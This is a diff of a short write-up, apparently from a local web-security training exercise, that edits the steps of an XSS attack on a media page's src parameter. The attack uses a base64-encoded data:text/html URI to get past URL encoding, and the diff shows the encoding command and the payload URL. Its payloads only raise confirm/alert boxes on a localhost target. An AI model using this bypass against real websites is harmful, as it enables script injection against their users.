@@ -6,13 +6,13 @@ The index page has a weirdly loaded image http://localhost:8080/index.php?page=m
 
 Visiting the page and changing the `src` query parameter shows an HTML `<object>` tag, with a `data` attribute which corresponds to `src`. For example, visiting `http://localhost:8080/index.php?page=media&src=ooga` yields `<object data="ooga">`.
 
-We start by trying an HTML injection with `src=<script>alert("ooga")</script>`
+We start by trying an HTML injection with `src=<script>confirm("ooga")</script>`, which wasn't executed.
 
-After trying a million things, we managed to bypass the url encoding with base 64, and do an xss attack
+We managed to bypass the URL encoding with base64, and do an XSS attack.
 
-```
-➜  darklyProject git:(master) ✗ echo '<script>alert()</script>' | base64
-PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
+```console
+$ echo -n '<script>confirm("ooga")</script>' | base64
+PHNjcmlwdD5jb25maXJtKCJvb2dhIik8L3NjcmlwdD4=
 ```
 
 this gives us a double wrong answer as http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
